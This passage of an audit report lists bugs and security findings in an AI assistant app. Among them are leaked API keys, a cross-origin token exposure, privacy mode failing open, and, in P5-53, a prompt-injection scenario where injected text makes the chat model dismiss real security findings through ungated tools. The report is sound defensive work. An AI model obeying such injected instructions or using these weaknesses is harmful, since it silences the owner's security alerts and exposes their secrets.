- scenario: a brain answers with citations ["pdf"] (or a made-up "paper-12 p1 xyz" containing a known id) -> citations_verified=True, fabricated=0; in no-key mode the attempt then passes on length alone.
- fix: require equality of normalized filenames/URLs (or a path-segment match of at least N characters) in one direction only.

### P5-44 [medium] Re-running hypothesis generation raises GraphError when the model repeats a statement with a different rationale
- where: dourmouse/research_pipeline/hypotheses.py:137-140 (store semantics at dourmouse/research_graph/store.py:194-216)
- problem: the hypothesis id is derived from the statement only, but GraphStore.put refuses an existing id whose version-1 body differs. The body includes the model's free-text "rationale", so the same statement with a different rationale (very likely on a second run, or twice within one reply) raises GraphError out of generate_hypotheses, aborting the loop after some hypotheses were already written and returning an exception instead of {"ok": ...}.
- evidence: `g.put("hypothesis", hid, {"statement": ..., "status": "proposed", "rationale": ...}, ...)`
- scenario: user runs research_hypothesize twice on the same question; the second run crashes on the first repeated statement.
- fix: check `g.get` first (skip or revise the rationale), or catch GraphError per hypothesis and count it as an existing one.

### P5-45 [medium] describe_samples reports p=0 ("significant") for zero-variance samples equal to the null, and for a NaN null
- where: dourmouse/research_pipeline/hypotheses.py:216-219
- problem: when the standard error is 0 the code sets t = inf regardless of whether mean equals null_mean, then maps any non-finite t to p = 0.0. Samples that are all exactly the null value (a deterministic experiment confirming the null) are reported as maximally significant; a model-supplied null_value of NaN/Infinity (float() of a JSON Infinity/NaN passes the isinstance check) also yields p = 0.0.
- evidence: `t = (mean - null_mean) / se if se > 0 else math.inf` / `p = ... if math.isfinite(t) else 0.0`
- scenario: design_and_run with code that writes samples [0.5]*100 and null_value 0.5 -> "t=inf, p=0": the system records a result claiming overwhelming evidence against a null that was in fact matched exactly.
- fix: if se == 0 return t = 0, p = 1 when mean == null_mean (else inf/0), and reject non-finite null values.

### P5-46 [medium] Schedule ids collide after any removal
- where: dourmouse/schedules.py:221
- problem: new ids are `sched-{len(entries)+1:03d}`, so deleting a non-last schedule and adding another reuses an existing id. remove(), mark_run(), set_enabled() and update_spec() all match by id, so they then act on the wrong entry or on both. Verified: add x3, remove sched-002, add -> ids [sched-001, sched-003, sched-003].
- evidence: `"id": f"sched-{len(entries) + 1:03d}",`
- scenario: the user deletes one routine and adds a new one; later "pause"/"delete" of the new one removes the older routine too, and mark_run records last_run on only the first match, so the other fires again every tick.
- fix: use max existing numeric suffix + 1 or a uuid.

### P5-47 [medium] SchedulerRunner thread dies on any exception outside _run_one
- where: dourmouse/schedules.py:352-389
- problem: `_loop` calls `_tick_once` with no try/except, and `_tick_once` has unguarded calls (`self._store.list()` read errors, `mark_run` write errors, `self._tracker.on_event(...)`, `datetime.fromisoformat` is guarded but the tracker call in the error branch is not). One exception ends the daemon thread for the rest of the process; running becomes False and every user schedule silently stops.
- evidence: `while not self._stop.wait(self._tick):` / `self._tick_once()`
- scenario: a transient OSError on schedules.jsonl or a tracker bug during one tick: no routine runs again until the app is restarted, with no log.
- fix: wrap each tick in try/except Exception and keep looping.

### P5-48 [medium] schedules.jsonl is read-modify-written by several threads without a lock and non-atomically
- where: dourmouse/schedules.py:198-251
- problem: add/remove/mark_run/set_enabled/update_spec each do `_load()` then `_save()` (plain write_text, no temp file, no lock). The runner thread's mark_run races with tool/UI edits from request threads, so one side's change is lost; a crash mid-write truncates the file, and `_load` silently skips unparsable lines, so schedules vanish.
- evidence: `self._path.write_text("\n".join(lines) + ..., encoding="utf-8")`
- scenario: the runner finishes a job and calls mark_run while the user deletes a schedule in the same second: the deletion is overwritten and the schedule reappears (or the new schedule is lost).
- fix: a module-level lock around every load/modify/save and an atomic temp-file replace.

### P5-5 [medium] POST /api/atlas-lab/sync crashes with AssertionError before the lab state exists
- where: dourmouse/atlas/atlas_lab.py:455-459 (caller dourmouse/webui.py:4603)
- problem: sync() -> _sync_locked() does `assert state is not None`, but _LAB_STATE is only created by get_state(). Boot calls start_auto_sync(), which does not create the state (the loop only does so after its first 300s wait). The sync route calls sync() directly without get_state().
- evidence: `state = _LAB_STATE` / `assert state is not None`
- scenario: user presses "sync" in the Atlas window right after start, before any GET endpoint touched the lab: 500 AssertionError (or AttributeError under python -O) instead of a sync.
- fix: call get_state() (or lazily create the state under _LAB_LOCK) at the top of _sync_locked.

### P5-51 [medium] new_unsigned_network_process never fires for processes with long or spaced names (lsof truncation vs psutil name)
- where: dourmouse/security/mac_detectors.py:114, 173-176 (observation key from dourmouse/security/baseline.py:61 and platform_adapter.py:272-283)
- problem: the baseline observation key for "network_process" is the lsof COMMAND column, which lsof truncates (default 9 characters) and escapes spaces in, while `by_name` is keyed by psutil's full process name (state["network_processes"][i]["name"]). For any program whose name is longer than the lsof width or contains a space (most GUI apps and helpers, and any attacker-chosen long name) `by_name.get(o.key)` returns None, `sig` is empty, and the unsigned/ad-hoc check never matches, so the "new unsigned program on the network" finding is silently skipped.
- evidence: `proc = by_name.get(o.key) or {}` followed by `if sig.get("kind") in ("unsigned", "adhoc", "unknown")`
- scenario: a new unsigned binary named "update-helper-daemon" starts calling out: baseline key "update-he", by_name has "update-helper-daemon", no finding is generated.
- fix: key the observation by pid -> psutil name (or exe path) via the same process details used for the signature lookup.

### P5-52 [medium] Privacy mode fails open: an unreadable or corrupt security.json turns it OFF
- where: dourmouse/security/privacy.py:30-39
- problem: `_read()` returns {} on any OSError/ValueError, so privacy_mode() returns False whenever the settings file cannot be read or parsed; the module's guarantee is that, when on, evidence "does not leave" the Mac. set_privacy_mode() likewise starts from {} on a corrupt file and rewrites it, dropping any other keys.
- evidence: `except (OSError, ValueError): return {}`
- scenario: security.json becomes unreadable (permission change, partial restore from backup, hand edit with a typo): the AI analyst resumes sending findings to the cloud model with no notice, although the owner had privacy mode on.
- fix: distinguish "file missing" (default off) from "file present but unreadable" (treat as on, or raise PrivacyModeOn).

### P5-53 [medium] security_sentry_dismiss and security_incident_update are ungated tools that can permanently silence real findings
- where: dourmouse/security/tools.py:169-205 (registered at 673-685, 701-718 with the default REGULAR permission)
- problem: while kill/quarantine/lockdown/privacy-mode changes are REQUIRES_CONFIRMATION, dismissing a finding ("it will not be reported as a new finding again") and closing an incident as RESOLVED/ACCEPTED_RISK run with no approval. The tool is callable by the chat model, which reads untrusted content (web pages, mail, file text), so a prompt injection or a plain model mistake can suppress a genuine finding (ARP spoofing, new persistence item, SIP off) without the owner ever seeing it.
- evidence: `ok = SentryStore(_sentry_db()).mark_false_positive(fingerprint)` reached with no confirm_prompt
- scenario: an injected instruction "mark all current findings as false positives" makes the sentry scan report a clean state afterwards.
- fix: give both tools permission=REQUIRES_CONFIRMATION with a prompt that quotes the finding title.

### P5-55 [medium] Approving a second draft of an already-approved tool overwrites its module, and a failing test then deletes it
- where: dourmouse/self_extensions.py:474-487 (write at 375-383, name check at 162-176)
- problem: validate_tool_name only checks the live registry, which does not contain an approved tool until restart, and add_draft never checks other drafts. Approving draft B with the same tool_name as an APPROVED draft A writes B's source over approved/<name>.py (and records B's hash). If B's test then fails, `(_approved_dir() / name).unlink()` removes the file while A is still APPROVED, so the startup loader later finds no module (or, with B passing, silently runs B's code instead of the A that was reviewed).
- evidence: `(_approved_dir() / f"{entry['tool_name']}.py").unlink(missing_ok=True)`
- scenario: the model drafts "fetch_x" twice; the owner approves both before restarting: the first approved tool vanishes or is replaced by the second.
- fix: refuse approval when any other draft with that tool_name is APPROVED, and write to a temp path, moving it into place only after the test passes.

### P5-58 [medium] merged_search promises "NEVER raises" but non-ExternalCorpusError failures escape; uuid/text vault ids crash the id map
- where: dourmouse/shared_rag.py:388, 524-537
- problem: _load_position_id_map does `int(r[0])` for every id, although _ID_COL_CANDIDATES explicitly includes "uuid"/"doc_id"/"chunk_id" (non-integer ids), so such a vault raises ValueError. query_spatial_vault also lets sqlite3.Error (bad ID_FILTER_SQL/ORDER_SQL, locked/ro failure) through. merged_search only catches ExternalCorpusError, and its local `mem.search()` call is not guarded at all, so these abort the calling turn instead of becoming a `warnings` entry.
- evidence: `return [int(r[0]) for r in rows]` and `except ExternalCorpusError as exc:` as the only handler
- scenario: a vault whose id column is a UUID string, or a typo in DOURMOUSE_SPATIAL_VAULT_ID_FILTER_SQL: the shared-memory tool raises ValueError/OperationalError.
- fix: keep ids as returned (no int()), catch Exception around both sources and report as warnings.

### P5-6 [medium] Catalog JSON parse errors abort the whole sync without recording sync_error
- where: dourmouse/atlas/atlas_lab.py:354-387, 467-475
- problem: _parse_csv_strategies is wrapped so it never raises, but _parse_catalog_json builds floats/ints from upstream JSON with no per-entry guard and `data.get(...)` assumes a dict. One bad value ("is_t": "n/a") or a list-shaped file raises ValueError/AttributeError out of _sync_locked after state.sync_error was cleared nowhere and before the swap. The initial worker and auto loop swallow it.
- evidence: `mean_return_pct=float(entry.get("is_mean_pct", entry.get("mean_pct", 0)) or 0),`
- scenario: upstream catalog gets one malformed entry; every sync silently fails forever, leaderboard goes stale, UI shows no error (sync_error empty) and last_sync never advances.
- fix: wrap the per-entry conversion in try/except and/or catch around the parse calls and set state.sync_error.

### P5-61 [medium] t212_order can place an order and still report an error (read timeout is not caught); duplicate orders on retry
- where: dourmouse/trading212_ops.py:102-114, 201-209
- problem: _request converts only HTTPError and URLError. A socket read timeout after the POST was sent raises TimeoutError out of resp.read() (not a URLError), which _wrap does not catch (it handles only NotConfigured/ValueError/RuntimeError), so the tool raises although T212 may have executed the order. Even for the URLError path the message says "unreachable", with no warning that the order may have gone through; there is no client order id or follow-up lookup, so the model's natural retry places a second order. `paper_confirm` is also just a model-supplied flag and `if not paper_confirm` accepts the truthy string "false".
- evidence: `with urllib.request.urlopen(req, timeout=_TIMEOUT) as resp:` / `raw = resp.read().decode()` with only HTTPError/URLError handlers
- scenario: T212 responds slowly (>15s) to a market order: the order fills, the tool reports an exception/unreachable, the model retries, a second order fills.
- fix: catch TimeoutError/OSError for POSTs and return "order status UNKNOWN: check positions before retrying"; require `paper_confirm is True`; check /equity/orders before any retry.

### P5-63 [medium] Watch-region ids collide after a deletion, and the file is written non-atomically
- where: dourmouse/world_watch_regions.py:158 (and 84-89, 178-189)
- problem: ids are `region-{len(regions)+1}`; deleting region-1 of two and adding another yields a second "region-2". check_region_hits keys its result dict by id, so the two regions overwrite each other's hits, and delete_region removes both. Saves use plain write_text with no lock, so concurrent add/delete lose updates and a crash mid-write truncates the file (which _load_regions then reads as "no regions").
- evidence: `"id": f"region-{len(regions) + 1}",`
- scenario: user draws A and B, deletes A, draws C: B and C share an id, alerts for one are reported under the other and deleting C also deletes B.
- fix: use a uuid or max(existing)+1, and write via temp file + os.replace.

### P5-66 [medium] FIRMS map key and ENTSO-E token are embedded in request URLs that appear verbatim in error text served to the UI
- where: dourmouse/world_pulse.py:614-619, 857-866, 1588-1589 (error text built at dourmouse/live_feeds.py:94-100)
- problem: the FIRMS key is a path segment (`/api/area/csv/{key}/...`) and the ENTSO-E token a query parameter (`securityToken={token}`). live_feeds._http_get raises `RuntimeError(f"HTTP {code} from {url}")` / `network error fetching {url}`, and world_pulse_snapshot stores `str(exc)[:200]` as `sources[name]["error"]`. That field is returned by /api/world/pulse and /details, copied into geo `unmappable`, and printed by world_brief's "feed was unreachable (...)" sentence (which also goes to the chat feed and message bus). A 4xx/5xx or timeout from either provider therefore leaks the secret to every viewer and into logs.
- evidence: `url = f"https://firms.modaps.eosdis.nasa.gov/api/area/csv/{key}/VIIRS_NOAA20_NRT/world/1"`
- scenario: FIRMS answers 503 once: the wildfires card shows "HTTP 503 from https://firms.../csv/<key>/VIIRS_NOAA20_NRT/world/1", and the morning brief posts it to the bus.
- fix: redact the key (replace it by "***" in the URL) before building the exception message, or send keys in a header where the API allows it.

### P5-67 [medium] The per-source timeout does not bound the snapshot (executor with-block waits for all workers) and concurrent callers each start a full fan-out
- where: dourmouse/world_pulse.py:1570-1605
- problem: `fut.result(timeout=_SOURCE_TIMEOUT + 2)` is documented as keeping a stalled feed from stalling the monitor, but the ThreadPoolExecutor is used as a context manager, so leaving the block calls shutdown(wait=True) and blocks until every worker returns. Channels make many sequential 8s requests (macro 8, markets about 14, news 3), so one slow provider can hold the snapshot for a minute or more. The cache lock is released while fetching and there is no in-flight marker, so every request that arrives while the cache is stale starts its own 17-thread fan-out (stampede), multiplying outbound calls and the rate-limit problems the module already hits.
- evidence: `with concurrent.futures.ThreadPoolExecutor(max_workers=_SOURCE_COUNT) as pool:` with `fut.result(timeout=...)` inside
- scenario: Yahoo hangs: GET /api/world/pulse and /api/worldmap block for the full serial duration, and several open map windows each trigger their own fetch.
- fix: shut the pool down with wait=False/cancel_futures after the deadline and add a single-flight lock (others wait for or reuse the in-progress snapshot).

### P5-68 [medium] Partial market failures are never reported: the "EQUITIES UNAVAILABLE" item is truncated away
- where: dourmouse/world_pulse.py:1295-1311
- problem: the warning item is appended last and then `items[:_MAX_ITEMS_PER_SOURCE]` (8) cuts it off whenever there are 8 or more real items, which is exactly the partial-failure case (e.g. gainers fail but losers, 5 quotes, crypto and FX succeed = 15 items). The comment says partial results are "reported as partial"; they are not. The warning text also always claims "Yahoo is rate-limiting this host (HTTP 429)" even when the failure was Binance or Frankfurter.
- evidence: `items.append(_item("EQUITIES UNAVAILABLE", ...))` followed by `return items[: _MAX_ITEMS_PER_SOURCE]`
- scenario: Yahoo drops two of five quotes: the card shows a plausible-looking market picture with no sign that data is missing.
- fix: insert the warning at the front (or reserve a slot) and build its text from the real failures list.

### U1-1 [medium] BROWSER fallback reload loads the real site, not the proxy URL
- where: ui/assets/os/screens/browser/index.js:593
- problem: reload() in frame mode calls loadFrame(hist.current(), proxied). openWeb() pushes the raw web address into hist (line 532), so for a proxied page hist.current() is the real URL. loadFrame() assigns it straight to iframe.src, whereas openWeb and goHistory wrap it as /api/browser-pane/proxy?url=...
- evidence: `loadFrame(hist.current(), frameProxied ? true : false);`
- scenario: outside Electron the owner opens https://example.com (proxied, banner says no cookies or logins reach it), then presses Reload. The iframe now loads the real site directly, bypassing the server proxy: the site sees the owner's IP and cookies, X-Frame-Options usually blanks the frame, and the banner still claims it is proxied.
- fix: in reload() (and any path that reuses hist.current() for a web address) build the proxy URL the same way goHistory does.

### U1-11 [medium] HUB: engine token is baked into a page that serve_hub.py serves with Access-Control-Allow-Origin: *
- where: ui/hub.html:161 (served by tools/serve_hub.py:37-50)
- problem: serve_hub.py replaces __ENGINE_TOKEN__ in hub.html with the real HUB_ENGINE_TOKEN and adds `Access-Control-Allow-Origin: *` to every response, including that one. Any web page the owner visits can fetch http://127.0.0.1:8791/hub.html cross-origin, read the response and extract the X-Engine-Token for the backtest engine (the token also sits in view-source).
- evidence: `const ENGINE_TOKEN = "__ENGINE_TOKEN__";`
- scenario: with HUB_ENGINE_TOKEN set, a malicious site (browsers without private-network preflight, e.g. Safari/Firefox) reads hub.html, gets the token, then calls the engine on 127.0.0.1:8790 (/api/backtest etc.) with it.
- fix: do not send ACAO * for the token-bearing page (or at all), and fetch the token through an authenticated same-origin call rather than templating it into HTML.

### U1-15 [medium] HOME and ORCHESTRATION read all hands run.started / run.finished as numeric seconds, but the server sends ISO strings
- where: ui/assets/os/screens/home/index.js:161 (also ui/assets/os/screens/orchestration/allhands.js:60)
- problem: dourmouse/all_hands.py stores "started" and "finished" with _now() = datetime.isoformat() (finished is None while running). HOME computes `now - Number(r.finished) < 600` and newestRuns sorts by `Number(b.started || 0)`. Number("2026-10-06T...") is NaN, so the comparison is always false and the sort comparator returns NaN.
- evidence: `(r.finished && now - Number(r.finished) < 600)`
- scenario: after an all hands run finishes, any HOME mount or event-stream resync re-seeds runs from GET /api/allhands (seedAllHands), so the strip that is meant to show "SEE THE ANSWER" for ten minutes disappears at once for runs the server finished; the link to the merged answer is only visible when the finish event was seen live in the same page. Skeleton runs built from events use numeric seconds, so the two kinds also sort inconsistently.
- fix: normalise both with Date.parse (the kit's toMs) when seeding, and compare in one unit.

### U1-16 [medium] all_hands.html never polls a run it started itself, and its comment-promised SSE retry is disabled
- where: ui/all_hands.html:336 (poll gate at 367-375)
- problem: the 2 s poll is created only inside `if (runId)` at page load, so a run started with the ALL HANDS button (runId set later) is never polled. The only live update path is the EventSource, and `es.onerror = () => es.close()` stops the browser's automatic reconnect, although the comment says "EventSource retries anyway" and calls the poll the always-on fallback.
- evidence: `es.onerror = () => es.close(); // poll covers it; EventSource retries anyway`
- scenario: open the window with no ?run=, start a goal; one transient stream error (server restart, laptop sleep, proxy idle timeout) closes the stream for good, so brain cards stay on "working..." and the synthesis never appears until the window is reloaded.
- fix: start the poll whenever runId becomes set (after start/click), and do not close the EventSource on error.

### U1-17 [medium] HUD shows hard-coded numbers as live suit and model readings
- where: ui/hud.html:606
- problem: ARC STABILITY is always 98% ("// model online" is just a comment), SHIELD INTEGRITY is 84% when a token is stored and 100% when not, and the INTENT confidence is set to the literal 94.3% the first time any agent is active. O2 RESERVES is the 1-minute load average divided by 100 shown in "days". None of these come from the server.
- evidence: `$('mShield').textContent = TOK ? '84%' : '100%';`
- scenario: the owner reads a HUD panel titled SUIT DIAGNOSTICS next to genuinely measured RAM/CPU and takes "SHIELD INTEGRITY 100%" with no login/token as a security status, and "CONFIDENCE 94.3%" as a model confidence; both are constants (the shield one is even inverted, no token reads healthier).
- fix: show only measured values and "n/a" for the rest, or label the gauges decorative.

### U1-19 [medium] ATLAS LAB proposals view re-renders every 5 s, resetting the run-target select and collapsing the code under review
- where: ui/atlas_lab.html:992 (loadProposals at 876-885)
- problem: while the PROPOSALS tab is shown, a 5 s interval calls loadProposals() and loadHistory(), each of which assigns innerHTML for the whole list. Every pending card is rebuilt: the "view generated code" <details> closes and the `<select id="target-...">` returns to its first option, "run: LOCAL".
- evidence: `$("pendingList").innerHTML = items.length ? items.map(renderPendingCard).join("")`
- scenario: the reviewer opens the generated code, reads for more than 5 s (it collapses under them), picks "run: DESKTOP ENGINE" and, before pressing APPROVE & RUN, the next poll silently resets the target to LOCAL; the click then runs the strategy locally instead of on the desktop engine, with no sign that the choice was lost.
- fix: skip the repaint when the data signature is unchanged, or preserve open/selected state across renders (e.g. key by proposal id).

### U1-20 [medium] (legacy page) console.html approval box moves focus onto APPROVE
- where: ui/console.html:2838-2840
- problem: addApproval() calls yes.focus() on the APPROVE button of a model-requested approval. The OS shell's approval-card.js deliberately focuses the card instead, because a stray Enter while typing must never approve.
- evidence: `yes.onclick=()=>decide(true); no.onclick=()=>decide(false);  yes.focus();`
- scenario: the owner is typing the next message in the composer when a gated tool (delete file, privileged command) raises an approval; focus jumps to APPROVE, and the Enter or Space that ends their sentence approves the action.
- fix: focus the box (tabindex -1) or the DECLINE button, never APPROVE.

### U1-21 [medium] (legacy page) console.html SETTINGS save failures are wiped by an immediate paintSettings()
- where: ui/console.html:5239-5245 (same pattern at 5186-5191, 5291-5299, 5341-5349, 5391-5399, 5442-5450, 5492-5500)
- problem: every chip handler writes the result ("Could not save: ...", the backend's refusal `detail`) into a note element and then calls paintSettings(), which replaces #settingsBody.innerHTML, so the note is rebuilt as "Loading..." (or "Currently: ...") at once. For the BYOK key save the typed key is also discarded.
- evidence: `note.textContent = jj.ok ? ... : "Could not save: " + (jj.detail || jj.error || "unknown error"); ... paintSettings();`
- scenario: picking "claude" as orchestrator model is refused; the comment above says the reason is now shown, but the message exists for less than one frame. A failed API key save or auto-approve change looks like it succeeded or did nothing, with no error and the typed key gone.
- fix: only repaint on success, or repaint first and then write the message.

### U1-3 [medium] ORCHESTRATION "OPEN PAGE" can never open: host.openExternal refuses a relative path
- where: ui/assets/os/screens/orchestration/index.js:289
- problem: the button calls ctx.host.openExternal('/all-hands?run=...'). core/host.js openExternal returns false for anything that is not http(s) or a macOS Privacy pane, so a path on this server is always rejected.
- evidence: `if (!ctx.host.openExternal('/all-hands?run=' + encodeURIComponent(win.dataset.ahWindow))) ctx.notify({ level: 'warn', ...`
- scenario: every click on OPEN PAGE on an all hands run shows the warning "This window could not open a separate page." The route /all-hands exists in webui.py, so the feature is simply unreachable from the shell.
- fix: build an absolute URL from location.origin before the call (and have the bridge accept it), or navigate in-app; do not pass a bare path to openExternal.

### U1-6 [medium] TIMETABLE schedule editor loses what the owner is typing every 10 seconds
- where: ui/assets/os/screens/timetable/index.js:98
- problem: load('poll') skips the repaint only when `!st.edit`. While an EDIT row is open the condition is false, so every poll runs st.entries = ...; paint(), which rebuilds the whole list with setHtml and re-renders the input with value="${e.schedule_text}" from the server.
- evidence: `if (sig === st.sig && reason === 'poll' && !st.edit) {`
- scenario: the owner clicks EDIT, starts typing "every weekday at 9:15", and within 10 seconds the poll replaces the input with the stored schedule text, discarding the typing (and the caret). SAVE then submits the old value or the owner has to retype.
- fix: skip the repaint (or preserve the open input's value) whenever the signature is unchanged, whether or not an editor is open.

### U1-7 [medium] VOICE: pressing LISTEN twice while the microphone prompt is pending leaks a live microphone stream
- where: ui/assets/os/screens/voice/index.js:250
- problem: startListening() guards only on st.recording, which is false until after `await getUserMedia`. A second press during that await starts a second capture; st.stream, st.recorder and st.stopTimer are overwritten, so the first MediaStream, recorder and 1 s interval can no longer be stopped by stopListening/endRecording.
- evidence: `st.stream = await navigator.mediaDevices.getUserMedia({ audio: true });`
- scenario: first use shows the macOS permission prompt for several seconds; the owner clicks LISTEN again. Both resolve. After STOP only the second stream's tracks are released; the first keeps the microphone open (system mic indicator stays on) until the screen is left, and its timer keeps calling stopListening/paintActions.
- fix: set a starting flag (or st.busy) before the await and bail out on re-entry, or stop any existing st.stream before assigning a new one.

### U1-9 [medium] Sign-in "system browser" bridge reads the Google URL with a cross-origin fetch, which the browser rejects
- where: ui/login.html:362 (same pattern in ui/setup.html:517)
- problem: inside the app webview the button calls fetch('/api/auth/google/start?claim=...', { redirect: 'follow' }) and uses r.url as the Google consent URL. The server answers 302 to https://accounts.google.com/..., a cross-origin hop whose final response carries no Access-Control-Allow-Origin, so a CORS-mode fetch rejects with a TypeError and r.url is never available.
- evidence: `fetch('/api/auth/google/start?claim=' + claim, { redirect: 'follow' }).then(r => r.url)`
- scenario: login.html falls into its .catch and navigates the embedded webview itself to Google, the exact "this browser or app may not be secure" refusal the claim bridge (showManualLink, startClaimPoll) exists to avoid, so those paths are effectively dead. setup.html step 3 shows "Could not reach Google: Failed to fetch" every time. (Derived from the Fetch spec and webui.py:6306-6375, which always sends a bare 302; not exercised live here.)
- fix: have the start route answer JSON {url} when ?claim= is present (or add an endpoint that returns the consent URL) and read that instead of following the redirect.

### A-10 [low] open_agent builds the window URL from an unencoded renderer-supplied name
- where: electron/main.js:3580
- problem: `openTaskWindow(name, `/agent/${name}`, ...)` interpolates the argument unescaped, whereas open_all_hands uses `encodeURIComponent`. A name such as `../api/x?y=1` or one containing `#` or `?` changes the loaded same-origin path (the window is a privileged one that carries the preload).
- evidence: `return openTaskWindow(name, `/agent/${name}`, { title: `AGENT // ${name.toUpperCase()}` });`
- scenario: Any script that can call `window.pywebview.api.open_agent` (all app pages and any injected script in them) can open an arbitrary same-origin path in a new preload-carrying window.
- fix: `encodeURIComponent(name)` and restrict to `^[A-Za-z0-9_-]{1,40}$`.

### A-11 [low] Downloads shelf will open HTML, SVG and webarchive files even though it claims to refuse anything that runs code
- where: electron/policy.js:170
- problem: `EXECUTABLE_EXT` is documented as "Files that run code when opened" and is the only gate for the console's Open action, but it does not list `.html`, `.htm`, `.xhtml`, `.svg`, `.webarchive`, `.mht`, `.jnlp`-style or Office macro formats (`.docm`, `.xlsm`). `shell.openPath` hands those to the default browser or app, where script runs from a file:// origin.
- evidence: `return !EXECUTABLE_EXT.has(n.slice(dot).toLowerCase());`
- scenario: A page in the pane downloads `invoice.html`; the owner clicks Open in the shelf; the script in it runs in the default browser with a file origin, which the policy comment says cannot happen from this button.
- fix: Add .html .htm .xhtml .svg .webarchive .mht .docm .xlsm .pptm and similar to the set, or invert to an allow list of inert types.

### A-12 [low] Stores keep a corrupt-file rename outside any try/catch, so one failed rename throws out of a store read
- where: electron/main.js:957
- problem: In `makeStore.get()` the corrupt-file branch calls `fs.renameSync(target(), aside)` with no guard. If the rename fails (read-only volume, permissions), the exception escapes `get()`, so every caller (history, bookmarks, passwords, permissions) throws instead of starting empty as the log line promises; in IPC handlers that surfaces as a rejected invoke, and in the page-title and did-navigate listeners as an uncaught exception.
- evidence: `fs.renameSync(target(), aside);`
- scenario: A corrupt `permissions.json` on a volume where rename is refused makes the pane permission handler throw for every request.
- fix: Wrap the rename in try/catch and continue with `data = fresh()`.

### A-15 [low] Credential config file is created with the default umask and only chmod'ed afterwards
- where: dourmouse/config.py:1129 (same pattern at 1187, 1244, 1316, 1364, 1419, 1481)
- problem: Every save_* writer calls `path.write_text(...)` and only then `os.chmod(path, 0o600)`. A new file (first save, or after the owner deleted it) holds API keys while readable at the umask default (usually 0644) until the chmod, and the containing directory is created with default mode.
- evidence: `path.write_text("\n".join(body) + "\n", encoding="utf-8")`
- scenario: Another local user (or a process of another account on a shared Mac) reads the file between the write and the chmod. Window is small but the file is the one holding OLLAMA_API_KEY and GEMINI_API_KEY.
- fix: Create with `os.open(path, O_WRONLY|O_CREAT|O_TRUNC, 0o600)` (or write a 0600 temp file and `os.replace`), and make the directory 0700.

### A-18 [low] Login cookie check raises ValueError on a malformed expiry instead of returning False
- where: dourmouse/webui.py:1978
- problem: The guard `... or not parts[1].isascii() and parts[1].isdigit()` binds as `(not isascii) and isdigit`, so it rejects only non-ASCII digit strings. An ASCII non-numeric expiry passes the guard and `int(parts[1])` on the next line raises.
- evidence: `or not parts[1].isascii() and parts[1].isdigit():`
- scenario: Verified: `_login_cookie_ok(token, "v1.abc.x.y")` and `"v1..x.y"` raise ValueError. `_authorized` calls it for every request carrying a `dourmouse_session` cookie from a non-loopback client, so a cookie with a bad value turns the auth check into an unhandled exception (traceback in the log, dropped connection) instead of a 401 redirect to /login, and the later `dourmouse_user_session` cookie is never examined.
- fix: `if not (parts[1].isascii() and parts[1].isdigit()): return False`.

### A-19 [low] GET /api/security/report?fresh=1 builds and writes a report, and GET requests are not cross-site checked
- where: dourmouse/webui.py:3669
- problem: A read-only looking GET route runs `build_report()` (system probes) and `save_report()` (writes a file) when `fresh=1`. `request_guard.check` only applies the Origin and Sec-Fetch-Site tests to non-safe methods, and `is_owner_route` only covers POST/PUT/PATCH/DELETE, so a page on any website can trigger it with an image or no-cors fetch to 127.0.0.1:8765 (the Host header is right).
- evidence: `r = _report.build_report()`
- scenario: A web page in the owner's browser fires the request in a loop: each call runs the host probes and writes another saved report, filling the reports folder and burning CPU.
- fix: Make fresh generation a POST under `/api/security/` (owner-only), keep GET read-only.

### A-21 [low] /api/auth/claim writes two status lines, so the response is malformed HTTP
- where: dourmouse/webui.py:6529
- problem: `_handle_auth_claim` calls `self.send_response(200)` and `send_header("Set-Cookie", ...)`, then `self._send_json(...)`, which calls `send_response` again. The header block therefore contains a second `HTTP/1.0 200 OK` line (plus a second Server and Date).
- evidence: `self.send_response(200)` followed by `self._send_json({"ok": True, "me": {`
- scenario: Reproduced by driving the handler against an in-memory file: the output has `HTTP/1.0 200 OK` at the top and again after Set-Cookie. Browsers skip the bad line, but strict parsers (Node's llhttp, Python's http.client header parser, which stops at the first non-header line and drops Content-Length and Content-Type) misread the response, so a non-browser client of the claim route breaks.
- fix: Pass the cookie through `_send_json(..., headers={"Set-Cookie": ...})` instead of sending a first response.

### A-22 [low] GET /api/settings/orchestrator-model reports the NVIDIA model as "current" when the active backend is another one
- where: dourmouse/webui.py:6848
- problem: When no env override and no live persisted choice exist, the handler reports `default_nvidia` with the NVIDIA default model whenever NVIDIA_API_KEY is set, regardless of which backend is actually active. The orchestrator actually uses `cfg.model_for_agent("orchestrator")` of the active config (Ollama, OmniRoute, ...), which this branch only reaches when there is no NVIDIA key.
- evidence: `elif os.environ.get("NVIDIA_API_KEY", "").strip():`
- scenario: A machine with a (dead or unused) NVIDIA key and Ollama Cloud active: the Settings picker shows the NVIDIA model as the orchestrator's current model while every turn runs on the Ollama model.
- fix: Use the active config's `model_for_agent("orchestrator")` first and only fall back to the NVIDIA default when the active backend is NVIDIA.

### A-23 [low] Hands-free turns that need a confirmation wait invisibly for 300 s while holding the global session lock
- where: dourmouse/webui.py:8771
- problem: `_hands_free_dispatch` runs `session.ask` under `server.session_lock` with `server.gate.set_emit(lambda _e: None)`. A gated tool then makes `WebConfirmationGate.__call__` emit `confirmation_requested` into nothing and block in `pending.wait()` for up to `_CONFIRM_TIMEOUT_SECONDS` (300 s); no window shows the prompt, and every typed chat request on the default session queues behind the lock.
- evidence: `server.gate.set_emit(lambda _e: None)`
- scenario: The owner says "send that email" by voice; the request needs approval, nothing appears on screen, hands-free and typed chat are frozen for five minutes, then the call is auto-declined.
- fix: Emit the confirmation to the events hub in hands-free mode (or decline immediately when no UI is attached) instead of waiting 300 s under the lock.

### A-4 [low] install_drm_electron.sh exits silently when the tag lookup fails, so its own error message never prints
- where: scripts/install_drm_electron.sh:57
- problem: Under `set -euo pipefail`, `pick_tag` ends in a pipeline whose first command is `git ls-remote ... 2>/dev/null`. When git fails (network down) the pipeline status is non-zero, the function returns non-zero, and the assignment `TAG="$(pick_tag "$MAJOR")"` aborts the script before the `if [ -z "$TAG" ]` block that prints "No castLabs tag was found ... (network down ...)".
- evidence: `TAG="$(pick_tag "$MAJOR")"`
- scenario: Reproduced in /tmp with an unreachable remote: exit status 128 and no output after the backup step. The owner sees the backup message and then nothing, with electron/package.json already backed up and no explanation.
- fix: `TAG="$(pick_tag "$MAJOR" || true)"`.

### A-5 [low] Media seek reports a false failure when the target equals the current position
- where: dourmouse/browser_scripts/media_control.js:108
- problem: The seek op waits up to 4 s for a `seeked` event after setting `m.currentTime = to`. When `to` equals the current time (seek by 0, seeking to the already-current second, or a clamp to the end when already there) the browser fires no `seeked`, so the wait times out, the call takes 4 s, and `error` is set to "the seek did not finish within 4 s" although `landed` is true.
